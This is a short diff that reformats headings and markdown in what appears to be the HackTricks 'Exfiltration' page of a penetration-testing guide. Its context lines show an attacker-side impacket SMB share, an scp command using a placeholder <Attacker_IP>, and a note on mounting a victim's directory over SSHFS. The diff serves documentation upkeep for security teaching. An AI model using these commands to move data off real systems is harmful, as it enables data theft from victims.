@@ -1,7 +1,5 @@
 # Exfiltration
 
-## Exfiltration
-
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
@@ -177,7 +175,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
 
-Or create a \*\*smb \*\*share **using samba**:
+Or create a smb share **using samba**:
 
 ```bash
 apt-get install samba
@@ -212,7 +210,7 @@ The attacker has to have SSHd running.
 scp <username>@<Attacker_IP>:<directory>/<filename> 
 ```
 
-## SSHFS
+### SSHFS
 
 If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
 
